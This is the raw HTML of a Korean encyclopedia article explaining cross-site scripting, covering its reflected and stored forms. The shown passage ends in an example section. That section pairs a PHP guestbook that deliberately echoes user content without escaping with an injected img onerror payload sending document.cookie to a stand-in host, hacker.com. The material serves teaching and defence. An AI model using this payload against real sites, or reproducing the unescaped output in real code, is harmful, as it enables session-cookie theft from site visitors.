<div class="mw-content-ltr" dir="ltr" id="mw-content-text" lang="ko"><script>function mfTempOpenSection(id){var block=document.getElementById("mf-section-"+id);block.className+=" open-block";block.previousSibling.className+=" open-block";}</script><p><b>사이트 간 스크립팅</b>(또는 <b>크로스 사이트 스크립팅</b>, 영문 명칭 cross-site scripting, 영문 약어 XSS)은 <a href="/wiki/%EC%9B%B9_%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98" title="웹 애플리케이션">웹 애플리케이션</a>에서 많이 나타나는 취약점의 하나로 <a href="/wiki/%EC%9B%B9%EC%82%AC%EC%9D%B4%ED%8A%B8" title="웹사이트">웹사이트</a> 관리자가 아닌 이가 <a href="/wiki/%EC%9B%B9_%ED%8E%98%EC%9D%B4%EC%A7%80" title="웹 페이지">웹 페이지</a>에 악성 <a class="mw-redirect" href="/wiki/%ED%81%B4%EB%9D%BC%EC%9D%B4%EC%96%B8%ED%8A%B8_%EC%82%AC%EC%9D%B4%EB%93%9C_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8" title="클라이언트 사이드 스크립트">스크립트</a>를 삽입할 수 있는 취약점이다. 주로 여러 사용자가 보게 되는 <a href="/wiki/%EC%A0%84%EC%9E%90_%EA%B2%8C%EC%8B%9C%ED%8C%90" title="전자 게시판">전자 게시판</a>에 악성 스크립트가 담긴 글을 올리는 형태로 이루어진다. 이 취약점은 웹 애플리케이션이 사용자로부터 입력 받은 값을 제대로 검사하지 않고 사용할 경우 나타난다. 이 취약점으로 해커가 사용자의 정보(<a href="/wiki/HTTP_%EC%BF%A0%ED%82%A4" title="HTTP 쿠키">쿠키</a>, <a href="/wiki/%EC%84%B8%EC%85%98" title="세션">세션</a> 등)를 탈취하거나, 자동으로 비정상적인 기능을 수행하게 하거나 할 수 있다. 주로 다른 웹사이트와 정보를 교환하는 식으로 작동하므로 사이트 간 스크립팅이라고 한다.<sup class="reference" id="cite_ref-1"><a href="#cite_note-1">[1]</a></sup></p>

<h2><span class="mw-headline" id=".EA.B3.B5.EA.B2.A9_.EC.9C.A0.ED.98.95">공격 유형</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85&amp;action=edit&amp;section=1" title="부분 편집: 공격 유형">편집</a><span class="mw-editsection-bracket">]</span></span></h2>
<p>크로스 사이트 스크립팅(XSS)의 공격 유형은 표준화로 정해져 있지 않지만, 전문가들은 크로스 사이트 스크립팅의 유형을 구분한다. <i>비 지속적인 공격(Non-persistent XSS)</i> 과 <i>지속적인 공격(persistent XSS)</i>. 그리고 소스코드 추가로 발생되는 <i><a class="new" href="/w/index.php?title=Document_Object_Model&amp;action=edit&amp;redlink=1" title="Document Object Model (없는 문서)">DOM</a> 기반 XSS</i> 등 유형으로 구분한다..</p>
<h3><span class="mw-headline" id=".EB.B9.84_.EC.A7.80.EC.86.8D.EC.A0.81_.28Non-persistent.29_.EA.B8.B0.EB.B2.95">비 지속적 (Non-persistent) 기법</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85&amp;action=edit&amp;section=2" title="부분 편집: 비 지속적 (Non-persistent) 기법">편집</a><span class="mw-editsection-bracket">]</span></span></h3>
<p><i>비 지속적 (Non-persistent</i>) <i>크로스 사이트 스크립팅</i> 취약점은 <i>반사 (Reflected)</i> XSS라고도 불리며, 가장 일반적인 유형이다. 웹 클라이언트가 제공하는 HTTP 쿼리 매개 변수 (예 : HTML 양식 제출)에서 적절하지 않고, 구문 분석 및 해당 사용자에 대한 결과의 페이지를 표시하는 공격 기법이다.</p>
<p>검증 되지 않은 사용자가 URL 파라미터나 HTTP 요청 헤더 정보를 수정하여 공격할 수 있다. 잠재적인 취약점이 존재하는 대상은 검색 엔진이다. : 검색 엔진의 검색창에서 하나의 문자열을 검색하는 경우, 검색 문자열은 일반적으로 결과 페이지에 그대로 다시 표시된다. 삽입 된 문자열을 다시 표시하면서 문자열이 가지고 있는 스크립트가 동작된다면 취약점이 존재하는 것 이다.</p>
<h3><span class="mw-headline" id=".EC.A7.80.EC.86.8D.EC.A0.81_.28persistent.29_.EA.B8.B0.EB.B2.95">지속적 (persistent) 기법</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85&amp;action=edit&amp;section=3" title="부분 편집: 지속적 (persistent) 기법">편집</a><span class="mw-editsection-bracket">]</span></span></h3>
<p><i>지속적 (persistent)</i> <i>크로스 사이트 스크립팅</i> 취약점은 더 치명적인 기법이다. : 공격자가 제공 한 데이터가 서버에 저장 한 다음 지속적으로 서비스를 제공하는 "정상"페이지에서 다른 사용자에게 노출된다. 해당 취약점이 대표적인 발생하는 위치는 사용자가 읽을 수있고, HTML 형식의 메시지를 게시 할 수 있는 온라인 게시판이 해당된다.</p>
<p>예를 들면, 회원들이 흥미를 볼 수 있는 검색이 가능한 웹 사이트가 존재한다고 가정하자. 개인 정보 보호를 위해, 이 사이트는 모든 사람들의 실제 이름과 이메일은 숨기고, 해당 사용자만 알 수 있다. 해당 서버에 회원이 로그인 하여 사이트에 접근할 때 회원의 실제 이름과 이메일은 브라우저에 있는 유일한 시간이다. 공격자는 해당 사이트에 가입하고, 사이트에서 볼 수 있는 사람들의 실제 이름을 알아내고 싶어 한다. 우선 공격자는 공격자의 프로필을 방문한 다른 사람의 브라우저에서 실행되도록 설계된 스크립트를 적용하여 원하는 정보를 수집하고 자신의 서버에 원하는 정보가 저장될 수 있게 한다. 만약 질문이 "너가 기억하는 가장 좋은 날을 입력하시오!"에 대한 물음란에 공격자는 짧은 대답 (정상처리 되는)내용과 다른 사용자의 이름과 이메일을 훔치는 스크립트를 입력한다. 다른 사용자가 공격자가 작성한 내용을 읽게 되면 접근한 사용자의 이름과 이메일 정보가 공격자에게 전송된다. 스크립트는 &lt;script&gt; 요소 내에 동봉 된 경우, 화면에 표시되지 않기 때문에 다른 사용자들의 이름과 이메일이 공격자에게 전송되어도 당사자는 해당 공격 행위를 알지 못한다.</p>
<p>공격자의 악의적인 스크립트가 피해자를 일일이 제 3 자 웹 사이트로 유인 할 필요없이, 자동으로 렌더링되기 때문에 지속적인 XSS 취약점은 다른 유형보다 더 위험하다.</p>
<h2><span class="mw-headline" id=".EC.98.88.EB.AC.B8">예문</span><span class="mw-editsection"><span class="mw-editsection-bracket">[</span><a href="/w/index.php?title=%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85&amp;action=edit&amp;section=4" title="부분 편집: 예문">편집</a><span class="mw-editsection-bracket">]</span></span></h2>
<p>다음과 같이, 사용자가 입력한 내용을 출력하는 방명록 프로그램이 있다고 하자.</p>
<div class="mw-highlight mw-content-ltr" dir="ltr">
<pre>
<span class="x">&lt;p&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">님의 말: &lt;/p&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$content</span><span class="p">;</span> <span class="cp">?&gt;</span>
</pre></div>
<p>만약 <i>$name</i>이 <i>"Hacker"</i>이고 <i>$content</i>가 다음과 같다고 하자.</p>
<div class="mw-highlight mw-content-ltr" dir="ltr">
<pre>
<span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Hello! I am a hacker.<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"#"</span> <span class="na">width</span><span class="o">=</span><span class="s">"0"</span> <span class="na">height</span><span class="o">=</span><span class="s">"0"</span> <span class="na">onerror</span><span class="o">=</span><span class="s">"this.src='http://hacker.com/gatherCookie.php?cookie='+encodeURIComponent(document.cookie);"</span> <span class="p">/&gt;</span>
</pre></div>
<p>그러면 다음과 같이 출력될 것이다.</p>
<div class="mw-highlight mw-content-ltr" dir="ltr">
